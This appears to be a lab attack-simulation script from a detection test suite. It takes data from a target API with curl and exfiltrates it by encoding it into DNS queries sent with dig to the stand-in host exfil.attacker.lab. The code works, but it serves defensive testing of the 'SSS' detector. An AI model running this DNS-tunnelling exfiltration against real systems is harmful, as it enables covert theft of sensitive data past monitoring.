#!/usr/bin/env bash
# =============================================================================
# 09 — Data Exfiltration: DNS Tunneling Simulation
# Tool: dig / nslookup with encoded payloads
# SSS should detect: data_exfiltration via anomalous DNS query patterns
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "09_data_exfil_dns"

VULN_PORT="${VULN_APP_PORT:-8888}"
EXFIL_DOMAIN="exfil.attacker.lab"  # Fake domain — queries will fail but traffic is generated

# ---------------------------------------------------------------------------
# Step 1: Steal sensitive data from the target
# ---------------------------------------------------------------------------
echo "[*] Attempting to exfiltrate data from ${TARGET_IP}:${VULN_PORT}/api/data..."
stolen_data=$(curl -s --max-time 10 \
    "http://${TARGET_IP}:${VULN_PORT}/api/data" 2>/dev/null) || stolen_data=""

if [[ -z "${stolen_data}" ]]; then
    record_result "false" "Could not reach /api/data endpoint to steal data." ""
    exit 0
fi

echo "[+] Sensitive data retrieved ($(echo "${stolen_data}" | wc -c) bytes)"

# ---------------------------------------------------------------------------
# Step 2: Encode and exfiltrate via DNS queries
# ---------------------------------------------------------------------------
echo "[*] Encoding stolen data into DNS queries..."

# Base64 encode the data, split into 63-char chunks (DNS label limit)
encoded=$(echo "${stolen_data}" | base64 -w 0 | tr '+/' '-_')
total_len=${#encoded}
chunk_size=50
queries_sent=0
queries_blocked=0

echo "[*] Sending ${total_len} bytes as DNS queries to ${EXFIL_DOMAIN}..."
echo "  (Each query carries ~${chunk_size} bytes of encoded data)"

for ((offset=0; offset<total_len; offset+=chunk_size)); do
    chunk="${encoded:offset:chunk_size}"
    # Simulate DNS exfiltration: query <encoded_chunk>.<sequence>.<domain>
    query="${chunk}.${queries_sent}.${EXFIL_DOMAIN}"

    # Use dig to send the query (it will NXDOMAIN but the traffic is visible)
    dig_result=$(timeout 3 dig +short +time=1 +tries=1 \
        "${query}" A 2>&1) || true

    if echo "${dig_result}" | grep -qiE "refused|timed out|connection reset"; then
        queries_blocked=$((queries_blocked + 1))
    fi

    queries_sent=$((queries_sent + 1))

    # Rate: ~10 queries/second (realistic exfil pace)
    sleep 0.1

    # Status update every 20 queries
    if (( queries_sent % 20 == 0 )); then
        echo "  Sent ${queries_sent} DNS queries (${queries_blocked} blocked)..."
    fi

    # Cap at 100 queries for the test (don't need to exfil everything)
    if [[ ${queries_sent} -ge 100 ]]; then
        echo "  Reached query limit (100). Stopping."
        break
    fi
done

echo "[*] DNS exfiltration complete: ${queries_sent} queries sent, ${queries_blocked} blocked."

# ---------------------------------------------------------------------------
# Determine result
# ---------------------------------------------------------------------------
if [[ ${queries_blocked} -gt $((queries_sent / 2)) ]]; then
    evidence="DNS exfil mostly blocked: ${queries_blocked}/${queries_sent} queries refused/timed out."
    record_result "false" "${evidence}" "Stolen data size: ${total_len} bytes encoded"
elif [[ -n "${stolen_data}" ]]; then
    evidence="Data exfiltrated via DNS: ${queries_sent} queries sent carrying encoded data from /api/data. ${queries_blocked} blocked."
    record_result "true" "${evidence}" "Data retrieved: $(echo "${stolen_data}" | head -c 500)"
else
    evidence="Could not steal initial data for exfiltration."
    record_result "false" "${evidence}" ""
fi
